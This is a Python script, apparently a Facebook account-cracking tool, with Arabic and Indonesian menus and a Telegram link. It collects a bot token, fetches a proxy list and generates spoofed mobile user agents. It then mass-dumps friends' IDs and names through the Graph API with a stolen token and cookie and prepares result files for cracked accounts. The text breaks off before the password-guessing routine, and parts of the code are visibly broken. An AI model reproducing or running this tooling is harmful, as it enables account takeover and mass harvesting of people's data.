import requests
import bs4
import json
import os
import sys
import random
import datetime
import uuid
import time
import re
import urllib3
import rich
import base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import sys
import time

    
os.system('clear')

try:
    import rich
except:
    cetak(nel('\t• Sedang Menginstall Modul Rich •'))
    os.system('pip install rich')

try:
    import stdiomask
except:
    cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
    os.system('pip install stdiomask')

try:
    import requests
except:
    Z = '\x1b[1;31m'
R = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
C = '\x1b[1;97m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
E = '\x1b[1;31m'
B = '\x1b[2;36m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
SA = '\x1b[38;5;216m'
S2A = '\x1b[1;36m'
S3A = '\x1b[38;5;180m'
S4A= '\x1b[38;5;88m' 
S5A = "\x1b[1;32m" 
S6A= '\x1b[38;5;166m'
K = '\033[2;35m'
listcolor=[SA,S2A,S3A,S4A,S5A,S6A]
color=random.choice(listcolor)
color3=random.choice(listcolor)
print('')
token=input('\x1b[1;36m {\033[32m𓅇 \x1b[38;5;117m}  \x1b[38;5;226mتوگن بوتگ   \x1b[38;5;234mજ⁀➴ ')
print('')
print(' \x1b[1;36m︻デ══━一💨💨')
print('')
ID=input('\x1b[1;36m {\033[32m𓅇 \x1b[38;5;161m}  آيـﮯديـﮯ بوتگ  \x1b[1;36mજ⁀➴  ︎ ')
print('')
print(' \x1b[38;5;166msh : 🧸 : جآر تشـغيـﮯل ')
time.sleep(2)
os.system('clear')
pretty.install()
CON = sol()
ugen2 = [
    'NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ar; nokiac2-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0']
ugen = [
    'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Opera/9.80 (Android; Opera Mini/7.5.33361/191.273; U; pt) Presto/2.12.423 Version/12.16 UNTRUSTED/1.0']
cokbrut = []
ses = requests.Session()
princp = []
try:
    prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:
    print(' ')
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Nokia5350/10.1.011 (SymbianOS/10;'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)'
    e = random.randrange(100, 9999)
    f = 'AppleWebKit/525 (KHTML, like Gecko)'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Safari/525 3gpp-gba'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R', 
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/413 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Safari/413 UNTRUSTED/1.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'SAMSUNG SM-X906B)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'nokiac1-01)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'U2/1.0.0 UCBrowser/8.9.0.251'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'U2/1.0.0 Mobile UNTRUSTED/1.06'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
asu = random.choice([
    m,
    O,
    h,
    u,
    b,
    MJ3,
    MJ2,
    MJ,
    AS2,
    AH2,
    B,
    WR,
    AS_F,
    AKH_T,
    AH_T,
    AB_KH,
    AZ_T,
    BN,
    SM,
    AS_T,
    AKH_F,
    AH_F,
    RS,
    AB_A,
    Z,
    p,
    b,
    kk,
    hh,
    x,
    Y,
    P,
    u,
    B,
    J,
    MJ4,
    p])
dic = {
    '12': 'December',
    '11': 'November',
    '10': 'October',
    '9': 'September',
    '8': 'August',
    '7': 'July',
    '6': 'June',
    '5': 'May',
    '4': 'April',
    '3': 'March',
    '2': 'February',
    '1': 'January' }
dic2 = {
    '12': 'Devember',
    '11': 'November',
    '10': 'October',
    '09': 'September',
    '08': 'August',
    '07': 'July',
    '06': 'June',
    '05': 'May',
    '04': 'April',
    '03': 'March',
    '02': 'February',
    '01': 'January' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def back():
    main_menu()
def linex():
	print('♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕')
def contact():
	os.system('xdg-open https://www.facebook.com/HANI ')
	back()
G = "\u001b[32m"
B = "\u001b[36m"
W = "\033[1;37m"
pemisah = '|'
q="968"
qq="8280"
qqq="52729"
qqqq="420"
client_id = f"{qqqq}038{q}89{qq}485649{qqq}208"
sim_hini = str(random.randint(2e4,4e4))
trace_id = str(uuid.uuid4())
 
try:
	android = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '').upper()
	model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '').upper()
	carrier = '' + subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '').upper()
except:
	android = random.choice(['TECNO', "INFINIX", "SAMSUNG"])
	model = random.choice(['LD2', "SM-J009", "SM-J505", "HOT12", "NOTE-11", "A5-PRO"])
	carrier = '' + random.choice(['02', 'Oramge', 'EE', "At&", "MTN", "Cricket"])

def ert():
	print(f'''[1] - COOKIE ➜ TOKEN ''')
	print(f'''[2] - CRACK PUBLIK ''')
	print(f'''[0] - EXIT ''')
	print('')
	print('╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍')
	_____alvino__adijaya_____ = input(f'''{u} [+] Choose : ''')
	if _____alvino__adijaya_____ in ('1','01'):
	   lol()
	elif _____alvino__adijaya_____ in ('2','02'):
		main()
	elif _____alvino__adijaya_____ in ('0','00'):
		oop()
		#print(' تــم تــســجــيــل خــروجــك ✓')
		


P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m" 

def main():
    os.system('clear')
    ip = requests.get('https://api.ipify.org').text
    gh = 'h'
#    print(f'''[1] - CRACK PUBLIK ''')
#    print(f'''[0] - LOGIN ''')
    print('')
   # print('╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍')
    print('')
    _____alvino__adijaya_____ = '27'
    if _____alvino__adijaya_____ in ('27',):
        crack_file()
    elif _____alvino__adijaya_____ in ('1',):
        file_create_menu().file_unlimmited()
    elif _____alvino__adijaya_____ in ('2',):
        lol()
    elif _____alvino__adijaya_____ in ('0',):
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         exit('Thanks For Using... !')
                   



def error():
    print(f'''{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}''')
    time.sleep(4)
    back()

def crack_file():
    
    try:
        print("""  
                 \x1b[38;5;22m⚜️ SPED MAX ⚜️   تم التطوير بواسطة 

\x1b[1;36m♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕⚜️ SPEED ⚜️♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕

\033[1;31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠞⠛⠛⠓⠶⣦⡀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠀⠀⠀⠀⠀⠀⠈⢻⣦⡶⠛⠋⠉⠉⠙⠻⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠈⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡄⠀⣤⣄⡀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⢘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠾⠛⠉⢿⣤⡻⠿⠁⠀⠀⠀⣠⣾⡋⢠⣿⣤⠀⠀⠀⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠉⠛⠳⠶⠶⠞⠛⠉⠈⠿⣮⣟⠋⠀⠀⢀⣠⣼⠛⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠉⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⢟⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣀⣀⣀⣀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣴⠟⠁⠀⠈⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢀⣴⠟⠋⠉⠉⢹⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣴⣟⣡⡄⠀⣠⡾⠋⠀⠉⠻⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠿⠋⢠⡿⠁⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠛⠋⠉⢹⠀⣴⠟⠁⠀⠀⠀⠀⠀⠉⠛⠷⢶⣦⣤⣤⣤⣴⠶⠶⣿⠋⠁⠀⠀⠀⢸⣇⠀⠀⠀⠀⢠⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠈⠀⠀⠀⠀⠀⢻⣦⡀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠉⠻⠷⠶⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣧⠀⠀⠀⠀⠀⠀⣀⣴⠾⠛⣻⣿⠷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠙⢷⣤⣀⣀⣤⣾⡏⠀⠀⢰⡟⠁⠀⠈⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣷⠀⠀⠀⠈⠙⠋⠁⣼⡇⠀⠀⢿⡄⠀⠀⠀⠀⠻⣧⡀⠀⠀⠀⠀⠀⠀⢀⣴⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣧⡀⠀⠀⠀⢀⣰⡟⠀⠀⠀⠸⣷⡀⠀⠀⠀⠀⢘⣿⣦⣄⣀⢀⣀⣴⠟⢁⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠶⠾⠛⠉⠀⠀⠀⠀⠀⠈⠻⠷⠦⠤⠶⠟⠉⠀⠉⠛⠛⠉⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠶⠛⠛⠛⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠶⠦⣤⣤⣄⣀⣤⣤⡴⠶⠛⠋⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⢀⣼⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⢉⠉⠉⠀⡀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢛⠷⢦⣤⣤⣤⣤⠾⠛⢁⠀⠀⠀


\x1b[1;36m♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕⚜️ SPEED ⚜️♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕

 \033[1;34mhttps://t.me/AS_5XZ

""")
        print('')
        fileX = input ('\x1b[38;5;117m{Ω} آدخل مـسـآر مـلف آيـﮯديـﮯآت   : ')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
    except:
        exit(f'''الملف غير موجود ''' % fileX)


def setting():
     
    print(f'''{N}├───[{H}1{N}] Old ''')
    print(f'''{N}├───[{H}2{N}] New {H}[RECOMMEND]{N}''')
    print(f'''{N}├───[{H}3{N}] Random {H}[RECOMMEND]{N}''')
    print(f'''{N}├──╭[{h}CHOICE METODE{N}]────────────────────────────────────────────''')
    hu = input(f'''│  ╰─➣{h} ''')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print(f'''{N}├───[{H}+{N}] Choose Yang Bener Kontooll ''')
        exit()
    print(f'''{N}├───────────────────────────────────────────────────────''')
    print(f'''{N}├───[{H}1{N}] Mobile {H}[RECOMMENDED]{N}''')
    print(f'''{N}├───[{H}2{N}] Mbasic ''')
    print(f'''├──╭[{h}CHOICE METODE{N}]────────────────────────────────────────────''')
    hc = input(f'''│  ╰─➣{h} ''')
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('2', '02'):
        method.append('mbasic')
    else:
        method.append('mobile')
    print(f'''{N}│''')
    passwrd()


def dump_massal():
    with requests.Session() as ses:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        a = input(f''' {u}ID : ''')
        
        try:
            params = {
                'fields': 'name,friends.fields(id,name,birthday)',
                'access_token': token }
            b = ses.get('https://graph.facebook.com/{}'.format(a), params=params, cookies={'cookie': cok }).json()
            for c in b['friends']['data']:
                id.append(c['id'] + '|' + c['name'])
            yu = f'''{b} Total ID =  \x1b[2;32m ''' + str(len(id))
            print(yu)
            setting()
        except Exception as e:
            print(e)

def dump_massal():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	try:
		print('')
		kumpulkan = int(input(f'''    {H}NUMBER IDS : '''))
		print('')
		
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f''' {N}[-] Your Id ''' + str(bilangan) + ' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	        os.system('clear')
	try:
	      os.system('clear')
	      op = f''' [{H}-{N}] {K}Total {H} = ''' + str(len(id))
	      print('')
	      print(op)
	      setting() 
	except Exception as e:
	    print(e) 
	    exit()

def setting():
   # print(' [ F ] -  M.FACEBOOK ')
    print('')
    raven1 = '1'
    hu = '3'
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        ric = ''
        sol().print(mark(ric, style='green'))
        exit()
    hc = '1'
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('',):
        print('[+] PILIH YANG BENAR BANG ')
        setting()
    elif hc in ('4', '04'):
        method.append('mbasic')
    else:
        method.append('mobile')
    print('')
    _jembot_ = 'Y'
    os.system('clear')
    if _jembot_ in ('',):
